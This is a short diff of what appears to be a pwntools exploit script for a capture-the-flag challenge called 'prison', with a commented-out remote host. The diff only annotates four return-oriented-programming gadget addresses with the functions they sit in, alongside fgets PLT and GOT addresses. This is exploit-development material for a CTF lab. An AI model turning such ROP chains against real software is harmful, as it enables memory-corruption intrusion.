@@ -11,10 +11,10 @@ p = gdb.debug('./prison_patched', '''
 
 # p = remote('challs.umdctf.io', 31001)
 
-GADGET_1 = 0x400608  # pop rbp; ret;
-GADGET_2 = 0x4005cf  # add bl, dh; ret;
-GADGET_3 = 0x400668  # add dword ptr [rbp-0x3d], ebx; nop dword ptr [rax+rax]; repz ret;
-GADGET_4 = 0x400782  # pop rdi; xor rbx, rbx; ret;
+GADGET_1 = 0x400608  # deregister_tm_clones: pop rbp; ret;
+GADGET_2 = 0x4005cf  # _start: add bl, dh; ret;
+GADGET_3 = 0x400668  # __do_global_dtors_aux: add dword ptr [rbp-0x3d], ebx; nop dword ptr [rax+rax]; repz ret;
+GADGET_4 = 0x400782  # __libc_csu_init: pop rdi; xor rbx, rbx; ret;
 
 FGETS_PLT = 0x400560  # fgets@plt
 FGETS_GOT = 0x601020  # fgets@got
